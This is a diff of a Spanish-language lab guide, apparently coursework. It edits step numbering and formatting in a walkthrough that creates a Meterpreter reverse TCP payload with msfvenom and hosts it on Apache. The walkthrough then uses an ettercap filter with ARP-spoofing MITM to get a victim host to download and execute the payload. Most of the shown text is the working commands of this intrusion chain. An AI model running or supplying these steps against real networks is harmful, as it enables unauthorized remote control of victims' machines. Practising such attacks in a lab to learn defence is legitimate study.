@@ -82,13 +82,10 @@ Instale *Metasploit*. Haga un ejecutable que incluya Reverse TCP meterpreter pay
 2. Creamos payload:
 > `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.51 LPORT=5555 -f elf > payload.bin`
 
-> :question: No entiendo que quieres decir a continuación:
-
 3. Lo mejor es subir el payload a tu servidor de apache, mueve el archivo con
+> `cp payload.bin /var/www/html/`
 
-> cp payload.bin /var/www/html/
-
-5. Creamos `ett.filter`:
+4. Creamos `ett.filter`:
 > `nano ett.filter`
 ```bash
 if (ip.proto == TCP && tcp.src == 80) {
@@ -105,10 +102,11 @@ if (ip.proto == TCP && tcp.src == 80) {
 7. Encendemos el ettercap con el filtro:
 > `ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.55/ //10.11.48.1/`
 
-- Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
+8. Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
 >  `lynx http://example.org`
 
-Podemos hacer tambien un curl, y descargar el link del payload con wget
+> [!Notes]
+> Podemos hacer tambien un curl, y descargar el link del payload con wget
 
 1. Damos permisos de ejecucion 
 > `chmod +x payload.bin`
